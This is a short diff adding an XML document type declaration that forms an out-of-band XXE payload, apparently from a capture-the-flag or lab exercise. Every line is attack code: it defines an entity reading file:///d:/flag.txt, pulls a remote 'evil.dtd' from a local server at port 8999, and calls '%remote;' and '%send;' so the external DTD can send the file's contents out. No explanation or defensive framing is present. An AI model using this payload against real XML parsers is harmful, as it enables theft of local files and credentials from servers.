@@ -1,0 +1,6 @@
+<!DOCTYPE ANY[
+        <!ENTITY % file SYSTEM "file:///d:/flag.txt">
+        <!ENTITY % remote SYSTEM "http://127.0.0.1:8999/evil.dtd">
+        %remote;
+        %send;
+        ]>
